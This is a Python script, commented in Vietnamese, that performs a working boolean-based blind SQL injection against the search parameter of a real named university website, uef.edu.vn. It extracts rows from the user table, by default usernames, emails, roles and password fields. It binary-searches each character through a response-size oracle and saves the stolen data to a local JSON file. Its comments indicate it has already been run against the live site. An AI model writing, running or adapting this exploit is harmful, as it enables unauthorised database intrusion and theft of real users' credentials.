#!/usr/bin/env python3
"""Data extractor (content oracle) cho uef.edu.vn txtSearch - lay 1 tap cot chi dinh.

Oracle giong sqli_ext_uef.py: the0"XOR(if(EXPR,1,0))XOR"Z -> TRUE ~82KB / FALSE 71052B.
Ly do ton tai: rows mode cua ext noi TAT CA cac cot qua CONCAT_WS; neu bang co cot
reserved word (vd `group`, `order`) thi SELECT bi syntax error -> oracle luon FALSE
-> moi row ra EMPTY (loi nay da xay that voi tbl_user luc 12:35). Script nay chi
lay cac cot chi dinh (mac dinh 6 cot cua tbl_user, khong cot nao reserved) va
backtick-wrap moi identifier nen an toan voi reserved word.

Cach dung: python3 sqli_data_uef.py rows <table> [n] [start=0] [workers=6] [maxlen=192] [cols_csv]
  <table>    : tbl_user (hoac uefweb.tbl_user neu schema khac)
  [n]        : so dong can lay; bo qua -> tu COUNT(*) va lay het (cap 500)
  [cols_csv] : danh sach cot phay-cach; mac dinh id,username,email,_roleId,_username,password

Ket qua: /tmp/sqli_usercols_uef.json (key datacols[<table>]) | Log: /tmp/sqli_enum_uef.log
Resume: chay lai cung lenh se bo qua idx da co (co VERIFY_FAILED se lay lai dong do).
LUU Y: khong chay 2 tien trinh cung luc vi cung ghi 1 file JSON.
"""
import sys, time, json, threading, urllib.parse, http.client, ssl, re
from concurrent.futures import ThreadPoolExecutor

HOST = "www.uef.edu.vn"
PATH = "/thu-vien-hinh-anh?Trang_1&txtSearch="
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
THRESH = 75000
LOG = "/tmp/sqli_enum_uef.log"
JSONF = "/tmp/sqli_usercols_uef.json"
DEFAULT_COLS = "id,username,email,_roleId,_username,password"
MAX_ROWS_CAP = 500
lock = threading.Lock()
stats = {"req": 0, "false_streak": 0}
cache = {}
_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE
_local = threading.local()
IDENT = re.compile(r"^[A-Za-z0-9_]+$")


def log(msg):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
    print(line, flush=True)
    with lock:
        with open(LOG, "a") as f:
            f.write(line + "\n")


def get_conn():
    c = getattr(_local, "conn", None)
    if c is None:
        c = http.client.HTTPSConnection(HOST, timeout=30, context=_ctx)
        _local.conn = c
    return c


def http_size(q):
    payload = 'the0"XOR(if(%s,1,0))XOR"Z' % q
    url = PATH + urllib.parse.quote(payload, safe="")
    for attempt in range(3):
        try:
            c = get_conn()
            c.request("GET", url, headers={"User-Agent": UA, "Accept": "*/*"})
            r = c.getresponse()
            body = r.read()
            with lock:
                stats["req"] += 1
            if r.status == 200:
                return len(body)
            log("HTTP %d, retry" % r.status)
            _local.conn = None
        except Exception as e:
            _local.conn = None
            if attempt == 2:
                log("HTTP_ERR %r expr=%s..." % (e, q[:60]))
        time.sleep(0.2 * (attempt + 1))
    return None


def ask(expr):
    with lock:
        if expr in cache:
            return cache[expr]
    size = http_size(expr)
    if size is None:
        return False  # loi mang: coi nhu FALSE, khong cache
    res = size >= THRESH
    with lock:
        cache[expr] = res
        stats["false_streak"] = stats["false_streak"] + 1 if not res else 0
        streak = stats["false_streak"]
    if streak >= 12:
        log("WARN 12 FALSE lien tiep - health check")
        h = http_size("1=1")
        if h is not None and h < THRESH:
            log("FATAL oracle broken: 1=1 -> %d bytes" % h)
            sys.exit(2)
        with lock:
            stats["false_streak"] = 0
        time.sleep(5)
    return res


def get_len(expr, maxlen=192):
    lo, hi = 0, maxlen
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("CHAR_LENGTH((%s))>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def get_char(expr, pos):
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("ASCII(SUBSTRING((%s),%d,1))>%d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if lo else ""


def extract(expr, label, workers=6, maxlen=192):
    n = get_len(expr, maxlen)
    if n <= 0:
        log("%s: EMPTY (NULL/rong)" % label)
        return ""
    chars = [""] * n
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(get_char, expr, p + 1): p for p in range(n)}
        for f, p in futs.items():
            chars[p] = f.result()
    s = "".join(chars)
    if n >= maxlen:
        log("%s = %r (TRUNCATED, len>=%d, req=%d)" % (label, s, maxlen, stats["req"]))
        return s + "...[TRUNCATED?]"
    esc = s.replace("\\", "\\\\").replace("'", "\\'")
    ok = ask("BINARY (%s)='%s'" % (expr, esc))
    log("%s = %r (verify=%s, len=%d, req=%d)" % (label, s, ok, n, stats["req"]))
    return s if ok else s + "...[VERIFY_FAILED]"


def num(expr, maxval=1000000):
    lo, hi = 0, maxval
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("(%s)>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    log("COUNT %s = %d" % (expr, lo))
    return lo


def load():
    try:
        with open(JSONF) as f:
            return json.load(f)
    except Exception:
        return {}


def save(d):
    with open(JSONF, "w") as f:
        json.dump(d, f, indent=1, ensure_ascii=False)


def ident(s, what):
    if not IDENT.match(s or ""):
        log("FATAL identifier khong hop le: %r (%s)" % (s, what))
        sys.exit(2)
    return s


def split_table(arg):
    if "." in arg:
        s, t = arg.split(".", 1)
        ident(s, "schema")
        ident(t, "table")
        return "table_schema='%s'" % s, "%s.%s" % (s, t)
    ident(arg, "table")
    return "table_schema=database()", arg


def mode_rows(table, n, start, workers, maxlen, cols_csv):
    where, frm = split_table(table)
    cols = [c.strip() for c in (cols_csv or DEFAULT_COLS).split(",") if c.strip()]
    if not cols:
        log("FATAL danh sach cot rong")
        sys.exit(2)
    for c in cols:
        ident(c, "column")
    sel = ",".join("IFNULL(`%s`,'~NULL~')" % c for c in cols)
    order = " ORDER BY `%s`" % cols[0] if cols[0] == "id" else ""
    d = load()
    key = "datacols[%s]" % table
    entry = d.get(key) or {}
    rows_list = entry.get("rows", [])
    have = {}
    for r in rows_list:
        have[r["idx"]] = r
    total = num("SELECT COUNT(*) FROM %s" % frm)
    n_target = n if n else min(total, MAX_ROWS_CAP)
    endi = min(start + n_target, total)
    log("ROWS6 %s: count=%d, lay %d..%d, cot=%s" % (table, total, start, endi, cols))
    t0 = time.time()
    for i in range(start, endi):
        old = have.get(i)
        if old and "VERIFY_FAILED" not in old.get("raw", ""):
            continue
        v = extract("SELECT CONCAT_WS('|',%s) FROM %s%s LIMIT %d,1" % (sel, frm, order, i),
                    "row6[%s][%d]" % (table, i), workers, maxlen)
        rec = {"idx": i, "raw": v}
        if v and "VERIFY_FAILED" not in v and "TRUNCATED" not in v:
            parts = v.split("|")
            if len(parts) == len(cols):
                rec["vals"] = dict(zip(cols, parts))
            else:
                rec["parse"] = "MISMATCH %d/%d" % (len(parts), len(cols))
        if old:
            rows_list = [r for r in rows_list if r["idx"] != i]
        rows_list.append(rec)
        rows_list.sort(key=lambda r: r["idx"])
        entry["cols"] = cols
        entry["count"] = total
        entry["rows"] = rows_list
        d[key] = entry
        save(d)
    ok_n = len([r for r in rows_list if "VERIFY_FAILED" not in r.get("raw", "")])
    log("ROWS6 %s DONE: %d/%d dong ok trong %.0fs, req=%d" % (table, ok_n, len(rows_list), time.time() - t0, stats["req"]))


USAGE = """Cach dung: python3 sqli_data_uef.py rows <table> [n] [start=0] [workers=6] [maxlen=192] [cols_csv]
  rows tbl_user                       -> 103 dong, 6 cot mac dinh
  rows tbl_user 3 0 6                 -> 3 dong dau de test
  rows tbl_user 10 50 8 192           -> 10 dong tu idx 50, workers 8
  rows tbl_user 5 0 6 192 id,username -> tuy chon cot
Ket qua: /tmp/sqli_usercols_uef.json | Log: /tmp/sqli_enum_uef.log"""


def main():
    a = sys.argv[1:]
    if not a or a[0] != "rows":
        print(USAGE)
        sys.exit(1)
    table = a[1]
    n = int(a[2]) if len(a) > 2 and a[2] != "all" else None
    start = int(a[3]) if len(a) > 3 else 0
    workers = int(a[4]) if len(a) > 4 else 6
    maxlen = int(a[5]) if len(a) > 5 else 192
    cols_csv = a[6] if len(a) > 6 else None
    t0 = time.time()
    log("=== DATA rows %s START ===" % table)
    mode_rows(table, n, start, workers, maxlen, cols_csv)
    log("=== DATA rows %s DONE in %.0fs, req=%d ===" % (table, time.time() - t0, stats["req"]))


if __name__ == "__main__":
    main()
